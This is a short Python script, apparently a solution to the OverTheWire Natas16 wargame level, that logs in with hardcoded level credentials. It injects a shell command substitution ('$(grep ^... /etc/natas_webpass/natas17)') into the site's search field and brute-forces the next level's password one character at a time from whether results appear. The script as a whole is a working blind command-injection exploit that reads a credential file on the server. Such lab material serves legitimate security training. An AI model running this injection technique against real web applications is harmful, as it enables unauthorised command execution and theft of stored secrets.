#!/usr/bin/env python 
'''
grep blind injection / hit and trial
'''

from string import *
import requests 
import re 
charset = lowercase + uppercase + digits 

r = requests.session()
url = "http://natas16.natas.labs.overthewire.org/" 
username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

seen = []
while(len(seen) < 32):
	for c in charset :
		print("".join(seen)+c)
		resp = r.post(url,data={'needle' : "anythings$(grep ^" + "".join(seen)+c +" /etc/natas_webpass/natas17)"},auth = (username,password))
		val = re.findall('<pre>\n(.*)\n</pre>',resp.text)
		if (not val):
			seen.append(c)
			break